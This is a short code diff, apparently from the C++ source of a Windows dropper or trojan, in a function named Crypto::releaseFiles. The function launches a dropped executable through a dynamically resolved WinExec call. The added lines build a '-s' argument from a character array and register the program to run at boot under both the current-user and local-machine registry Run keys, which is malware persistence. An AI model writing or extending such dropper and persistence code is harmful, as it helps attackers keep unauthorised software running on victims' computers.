@@ -253,7 +253,10 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 
 		ret =lpWinExec(szcmd, SW_SHOW);
 
-		ret = setRegBootRun(HKEY_CURRENT_USER, runningfn.c_str());
+		char secondBoot[] = { '-','s',0 };
+		wsprintfA(szcmd, "\"%s\" %s", runningfn.c_str(), secondBoot);
+		ret = setRegBootRun(HKEY_CURRENT_USER, szcmd);
+		ret = setRegBootRun(HKEY_LOCAL_MACHINE, szcmd);
 	}
 
 	if (docfn != "")
